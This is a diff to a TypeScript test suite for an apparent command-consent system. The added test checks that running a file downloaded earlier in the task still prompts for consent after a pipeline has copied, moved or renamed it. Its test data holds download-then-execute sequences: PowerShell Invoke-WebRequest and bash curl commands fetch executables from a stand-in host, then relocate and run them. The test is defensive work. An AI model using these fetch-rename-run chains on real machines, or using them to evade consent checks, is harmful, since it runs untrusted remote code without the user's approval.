@@ -19,7 +19,7 @@ import { revokePendingCommands } from "../../app/main/commands/pending";
 import { comparePaths, rootOwned } from "../../app/main/commands/scripts";
 import type {
   Classification, CommandCapability, CommandCard, CommandDecision, CommandMode, CommandService, DecideInput, GitFacts, PathFact, RunExit, RunnerFacts,
-  RunningCommand, RunSpec,
+  RunningCommand, RunSpec, ShellId,
 } from "../../app/main/commands/types";
 import type { TargetBinding } from "../../app/main/targets/types";
 import type { ConsentPanel } from "../../app/shared/consent";
@@ -1950,6 +1950,33 @@ describe("running and what comes back (§3.8.3 steps 12-14, §3.8.6)", () => {
       expect((await call(h, { target: "this computer", shell, command: fetch })).resultType, fetch).toBe("success");
       expect((await call(h, { target: "this computer", shell, command: then })).resultType, then).toBe("success");
       expect((await call(h, { target: "this computer", shell, command: run })).resultType, `${then} / ${run}`).toBe("denied");
+      expect((h.asked.at(-1)?.panel as { card: CommandCard }).card.says, run).toContain("Runs a file downloaded in this task.");
+    }
+  });
+
+  it("asks before running a download a pipeline copied, moved or renamed first, in PowerShell and through xargs (commands-remote-v4-5)", async () => {
+    setCommandJudge(null);
+    const WIN: TargetBinding = { ...LOCAL, screenOs: "win32", shellOs: "win32" };
+    const facts: Partial<RunnerFacts> = {
+      os: "win32", shells: ["powershell", "cmd"], shellPaths: { powershell: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmd: "C:\\Windows\\System32\\cmd.exe" },
+      script: null, home: "C:\\Users\\ana", user: "ana", ember: { paths: ["C:\\Users\\ana\\AppData\\Local\\ember"], pids: [10], names: /^ember$/ },
+    };
+    const sequences: [TargetBinding, Partial<RunnerFacts> | undefined, ShellId, string, string, string][] = [
+      [WIN, facts, "powershell", "Invoke-WebRequest -Uri https://e.example/x.exe -OutFile x.exe", "Get-ChildItem x.exe | Copy-Item -Destination y.exe", ".\\y.exe"],
+      [WIN, facts, "powershell", "Invoke-WebRequest -Uri https://e.example/x.exe -OutFile x.exe", "Get-Item .\\x.exe | Move-Item -Destination y.exe", ".\\y.exe"],
+      [WIN, facts, "powershell", "Invoke-WebRequest -Uri https://e.example/x.py -OutFile x.py", "gci x.py | cpi -Destination y.py", "python y.py"],
+      [WIN, facts, "powershell", "Invoke-WebRequest -Uri https://e.example/x.exe -OutFile x.exe", "Get-Item x.exe | Rename-Item -NewName y.exe", ".\\y.exe"],
+      [WIN, facts, "powershell", "Invoke-WebRequest -Uri https://e.example/x.exe -OutFile x.exe", "$items | Copy-Item -Destination y.exe", ".\\y.exe"],
+      [LOCAL, undefined, "bash", "curl -fsSL -o x.sh https://e.example/x.sh", "ls x.sh | xargs -I{} cp {} y.sh", "sh y.sh"],
+    ];
+    for (const [binding, f, shell, fetch, then, run] of sequences) {
+      // Nothing is there yet; a step that asks is allowed, and running the copy is not.
+      const h = harness({ binding, ...(f ? { facts: f } : {}), paths: p => ({ exists: false, real: p }), run: () => ({ output: ["done\n"] }), answers: ["once", "once"] });
+      expect((await call(h, { target: "this computer", shell, command: fetch })).resultType, fetch).toBe("success");
+      expect((await call(h, { target: "this computer", shell, command: then })).resultType, then).toBe("success");
+      const asked = h.asked.length;
+      await call(h, { target: "this computer", shell, command: run });
+      expect(h.asked.length, `${then} / ${run}`).toBe(asked + 1);
       expect((h.asked.at(-1)?.panel as { card: CommandCard }).card.says, run).toContain("Runs a file downloaded in this task.");
     }
   });
